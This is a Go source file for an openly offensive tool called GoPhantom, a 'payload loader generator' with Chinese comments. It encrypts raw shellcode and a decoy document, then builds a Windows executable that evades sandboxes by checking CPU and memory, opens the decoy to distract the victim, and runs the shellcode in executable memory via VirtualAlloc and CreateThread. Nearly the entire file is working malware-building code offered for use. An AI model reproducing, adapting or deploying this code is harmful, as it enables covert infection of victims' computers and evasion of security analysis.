package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"gofilepacker/internal/keymgr" // 新增导入
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ___        ___ _                 _                  
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___  
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \ 
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                           by hsad
`

// loaderTemplate 是最终加载器可执行文件的 Go 源代码模板。
// v1.1 更新: 移除 AES 密钥常量，替换为 Salt 常量。
// AES 密钥现在在运行时使用 Argon2id 派生。
const loaderTemplate = `
//go:build windows
// +build windows

// 由 GoPhantom 生成的最终加载器
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"golang.org/x/crypto/argon2" // 新增导入
	"golang.org/x/sys/windows"
	"os"
	"path/filepath"
	"runtime"
	"time"
	"unsafe"
)

// 这些常量由生成器在编译时动态注入。
const (
	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
	aesSaltBase64            = "{{.Salt}}" // 已修改: 用 Salt 替换了 Key
	decoyFileName            = "{{.DecoyFileName}}"
)

// decryptAESGCM 使用通过 Argon2id 从 Salt 派生出的 AES 密钥来解密 Base64 编码的数据。
func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
	// 从 Salt 使用 Argon2id 派生 AES 密钥
	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
	if err != nil {
		return nil, fmt.Errorf("salt decoding failed: %v", err)
	}

    // 这些参数必须与生成器的 keymgr 包中的参数匹配
    const (
        argon2Time    = 1
        argon2Memory  = 64 * 1024
        argon2Threads = 4
        keyLength     = 32
    )
    var argon2Password = []byte("gophantom-static-secret-for-derivation")

	key := argon2.IDKey(argon2Password, salt, argon2Time, argon2Memory, argon2Threads, keyLength)

	// 后续的解密流程保持不变
	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }

	block, err := aes.NewCipher(key)
	if err != nil { return nil, fmt.Errorf("failed to create new cipher: %v", err) }

	gcm, err := cipher.NewGCM(block)
	if err != nil { return nil, fmt.Errorf("failed to create new GCM: %v", err) }

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { return nil, fmt.Errorf("ciphertext is too short") }

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// antiSandboxChecks 执行基本的反沙箱环境检查。
func antiSandboxChecks() {
	if runtime.NumCPU() < 2 {
		os.Exit(0)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")
	
	type memoryStatusEx struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}

	var memStatex memoryStatusEx
	memStatex.Length = uint32(unsafe.Sizeof(memStatex))
	
	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatex)))
	if ret != 0 {
		if memStatex.TotalPhys/1024/1024/1024 < 4 {
			os.Exit(0)
		}
	}
}

// executeShellcode 分配内存，复制并执行 shellcode。
func executeShellcode(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	createThread := kernel32.NewProc("CreateThread")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return
	}

	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
	copy(dst, shellcode)
	
	createThread.Call(0, 0, addr, 0, 0, 0)
}

func main() {
	antiSandboxChecks()

    // 已修改: 对 decryptAESGCM 的调用现在传递 Salt
	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64)
	if err == nil {
		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
		_ = os.WriteFile(decoyPath, decoyBytes, 0644)
		
		verb, _ := windows.UTF16PtrFromString("open")
		path, _ := windows.UTF16PtrFromString(decoyPath)
		windows.ShellExecute(0, verb, path, nil, nil, windows.SW_SHOWNORMAL)
	}
	
	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64)
	if err == nil {
		executeShellcode(shellcode)
	}

	time.Sleep(3 * time.Second)
}
`

// TemplateData 用于向模板中注入数据。
// 已修改: 将 Key 替换为 Salt。
type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Salt             string
	DecoyFileName    string
}

// encryptAESGCM 使用 AES-256-GCM 加密数据并返回 Base64 编码的字符串。
func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	log.SetFlags(0)
	log.Println(logo)

	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "FinalLoader.exe", "Optional: Final output executable name.")
	flag.Parse()

	if *decoyFile == "" || *payloadFile == "" {
		log.Println("\nError: Both -decoy and -payload flags are required.")
		log.Println("Usage:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}

	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	// --- 已修改: 密钥派生流程 ---
	log.Println("[+] Deriving AES-256 key using Argon2id...")
	// keymgr 会处理从 GOPHANTOM_SALT 读取或生成新随机 Salt 的逻辑。
	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
	if err != nil {
		log.Fatalf("[-] Failed to derive key and salt: %v", err)
	}

	log.Println("[+] Encrypting decoy file with derived key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same derived key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	// --- 已修改: 模板填充 ---
	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Salt:             base64.StdEncoding.EncodeToString(salt), // 将 Salt 传递给模板
		DecoyFileName:    filepath.Base(*decoyFile),
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		log.Fatalf("[-] Failed to parse loader template: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	tmpfile, err := os.CreateTemp("", "loader-*.go")
	if err != nil {
		log.Fatalf("[-] Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
		log.Fatalf("[-] Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("[-] Failed to close temp file: %v", err)
	}

	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
	ldflags := "-s -w -H windowsgui"
	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("[-] Compilation failed:\n%s", string(output))
	}

	log.Printf("\n[✓] Successfully generated loader: %s\n", *outputFile)
}
